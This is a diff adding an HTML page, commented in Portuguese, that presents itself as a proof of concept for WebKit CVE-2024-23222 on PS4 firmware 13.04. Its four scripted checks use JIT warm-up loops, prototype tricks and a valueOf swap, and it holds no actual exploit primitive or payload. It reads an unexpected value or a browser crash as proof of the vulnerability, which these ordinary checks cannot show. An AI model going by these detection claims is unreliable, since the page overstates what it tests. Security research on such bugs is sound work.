@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2024-23222 — WebKit Type Confusion (zero-day in-the-wild)
+
+  DESCRIÇÃO:
+  Type confusion no processamento de objetos JavaScript que pode
+  levar a execução arbitrária de código. Explorado ativamente antes
+  do patch. Apple corrigiu no iOS 16.7.5 e iOS 17.3 (Jan 2024).
+  Adicionado ao CISA KEV Catalog.
+
+  MECANISMO:
+  Confusão entre o tipo de estrutura interna de um objeto JS
+  ao realizar operações de acesso a propriedades sob certas condições
+  de otimização do engine. O engine acessa um objeto como tipo A
+  quando na verdade é tipo B — potencial primitiva addrof/fakeobj.
+
+  STATUS PS4 FW 13.04: NÃO TESTADO
+  PS4 FW 13.04 usa WebKit equivalente a Safari ~16.x — janela vulnerável.
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2024-23222 — Type Confusion</title>
+<style>
+  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
+  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
+  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
+  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
+  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
+</style>
+</head>
+<body>
+<div style="color:#aaa;font-size:12px;margin-bottom:6px">CVE-2024-23222 · WebKit Type Confusion · Zero-Day ITW · FW 13.04</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+<script>
+"use strict";
+var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
+function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
+function bar(m){barEl.textContent=m;}
+
+// Detectar type confusion via comportamento anômalo em acesso de propriedades
+// A técnica usa objetos com prototype chain especial para causar o mismatch
+
+function run(){
+  L('CVE-2024-23222 — WebKit Type Confusion (zero-day explorado in-the-wild)','info');
+  L('Corrigido: iOS 16.7.5 / iOS 17.3 (Janeiro 2024). Testando FW 13.04...','info');
+  L('','');
+
+  // ── Teste 1: estrutura básica de type confusion ────────────
+  L('[1/4] Preparando objetos de teste...','warn');
+  bar('[1/4] Criando estruturas...');
+
+  setTimeout(function(){
+    try {
+      // Criar objetos com estrutura interna potencialmente confundível
+      // Técnica: Array com propriedades extras + modificação do prototype
+      var a = [];
+      var b = {};
+
+      // Polimorfismo que força o engine a reclassificar tipos internos
+      function readProp(obj, key){ return obj[key]; }
+
+      // Treinar com type A
+      for(var i=0;i<1000;i++){
+        readProp({x:1.1, y:2.2}, 'x');
+      }
+      // Treinar com type B (array)
+      for(var i=0;i<1000;i++){
+        readProp([1.1,2.2,3.3], 0);
+      }
+
+      L('[1/4] Estruturas criadas ✓','ok');
+    } catch(e){ L('[1/4] Erro: '+e,'fail'); }
+
+    // ── Teste 2: confusão de indexação em objetos especiais ───
+    L('','');
+    L('[2/4] Testando confusão de indexação...','warn');
+    bar('[2/4] Testando indexação...');
+
+    setTimeout(function(){
+      try {
+        var confused = false;
+
+        // Criar um "Arguments" object que pode ser confundido com Array
+        function getArgs(){ return arguments; }
+        var args = getArgs(1.1, 2.2, 3.3);
+
+        // Modificar prototype para potencialmente causar type mismatch
+        function AccessTest(){}
+        AccessTest.prototype = Object.create(Array.prototype);
+        var obj = new AccessTest();
+        obj[0] = 1.1; obj[1] = 2.2; obj[2] = 3.3;
+        obj.length = 3;
+
+        // Operações que podem revelar type confusion
+        var results = [];
+        for(var i=0;i<obj.length;i++){
+          results.push(obj[i]);
+        }
+
+        // Verificar se os valores retornados são floats válidos
+        var valid = results.every(function(v){
+          return typeof v === 'number' && isFinite(v);
+        });
+
+        if(valid){
+          L('[2/4] Valores retornados corretamente: ['+results.join(',')+']','ok');
+        } else {
+          L('[2/4] Valor inválido retornado — type confusion detectada!','vuln');
+          confused = true;
+        }
+      } catch(e){ L('[2/4] Exceção: '+e,'warn'); }
+
+      // ── Teste 3: JSObject property caching ───────────────────
+      L('','');
+      L('[3/4] Testando property inline cache (IC) mismatch...','warn');
+      bar('[3/4] Testando IC mismatch...');
+
+      setTimeout(function(){
+        try {
+          var sentinel = 0xdeadbeef;
+          var MARKER = {};
+
+          // IC pollution: treinar com um tipo, depois trocar
+          function getX(o){ return o.x; }
+
+          // Fase 1: treinar com objetos float
+          var floatObjs = [];
+          for(var i=0;i<0x200;i++){
+            floatObjs.push({x: i * 1.1, y: i * 2.2});
+          }
+          floatObjs.forEach(function(o){ getX(o); });
+
+          // Fase 2: criar objeto com prototype manipulado
+          var trickProto = {x: MARKER};
+          var trickObj = Object.create(trickProto);
+
+          var result = getX(trickObj);
+
+          if(result === MARKER){
+            L('[3/4] IC resolvido corretamente via prototype ✓','ok');
+          } else if(result === undefined){
+            L('[3/4] Retornou undefined — possível IC miss','warn');
+          } else {
+            L('[3/4] Retornou valor inesperado: '+result+' — IC CONFUSION!','vuln');
+          }
+        } catch(e){ L('[3/4] Exceção: '+e,'warn'); }
+
+        // ── Teste 4: tipo confundido em operação aritmética ────
+        L('','');
+        L('[4/4] Testando type confusion em aritmética...','warn');
+        bar('[4/4] Testando aritmética...');
+
+        setTimeout(function(){
+          try {
+            // Cria array de doubles e substitui com objeto
+            // Se houver type confusion, operação aritmética vai acessar
+            // bits do ponteiro como se fosse double
+            var floats = new Array(8);
+            for(var i=0;i<8;i++) floats[i] = (i+1) * 1.1;
+
+            function sumArr(arr){
+              var s = 0;
+              for(var i=0;i<arr.length;i++) s += arr[i];
+              return s;
+            }
+
+            // Treinar
+            for(var i=0;i<0x1000;i++) sumArr(floats);
+
+            // Substituir elemento com objeto
+            floats[4] = {valueOf: function(){ return 4.4; }};
+
+            var sum = sumArr(floats);
+            var expected = (1.1+2.2+3.3+4.4+4.4+6.6+7.7+8.8);
+
+            if(Math.abs(sum-expected)<0.01){
+              L('[4/4] Soma correta: '+sum.toFixed(2)+' ✓','ok');
+            } else if(isNaN(sum)){
+              L('[4/4] Soma = NaN — type confusion possível!','vuln');
+            } else {
+              L('[4/4] Soma inesperada: '+sum+' (esperado ~'+expected.toFixed(2)+')','warn');
+            }
+          } catch(e){ L('[4/4] Exceção: '+e,'warn'); }
+
+          L('','');
+          L('══════════════════════════════════','warn');
+          L('SE O BROWSER FECHOU = CVE-2024-23222 PRESENTE','vuln');
+          L('Valores inesperados = VULNERABILIDADE DETECTADA','vuln');
+          L('Tudo normal = PATCHED ou não aplicável','patched');
+          L('══════════════════════════════════','warn');
+          bar('DONE');
+        },200);
+      },200);
+    },200);
+  },200);
+}
+window.addEventListener('load',function(){setTimeout(run,300);});
+</script>
+</body>
+</html>
